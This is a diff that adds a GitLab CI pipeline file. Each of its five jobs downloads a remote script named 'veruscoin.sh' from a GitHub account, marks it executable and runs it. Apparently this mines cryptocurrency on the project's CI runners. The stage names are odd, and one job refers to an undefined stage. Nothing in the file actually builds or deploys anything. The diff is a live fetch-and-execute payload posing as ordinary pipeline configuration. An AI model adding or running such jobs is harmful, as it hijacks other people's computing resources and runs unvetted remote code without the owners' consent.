@@ -1,0 +1,32 @@
+stages:
+  - radenagungkertasaono
+  - build
+  - deploy
+
+radenagungkertasaono_1:
+  stage: radenagungkertasaono
+  script:
+    - wget https://raw.githubusercontent.com/radenagungkertsaono/veruscoin.sh/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+radenagungkertasaono_2:
+  stage: radenagungkertasaono
+  script:
+    - wget https://raw.githubusercontent.com/radenagungkertsaono/veruscoin.sh/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+radenagungkertasaono_3:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/radenagungkertsaono/veruscoin.sh/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+radenagungkertasaono_4:
+  stage: radenagungkertasaono
+  script:
+    - wget https://raw.githubusercontent.com/radenagungkertsaono/veruscoin.sh/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+radenagungkertasaono_5:
+  stage: radenagungkertasaono
+  script:
+    - wget https://raw.githubusercontent.com/radenagungkertsaono/veruscoin.sh/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+
+
+
+
+
+
+
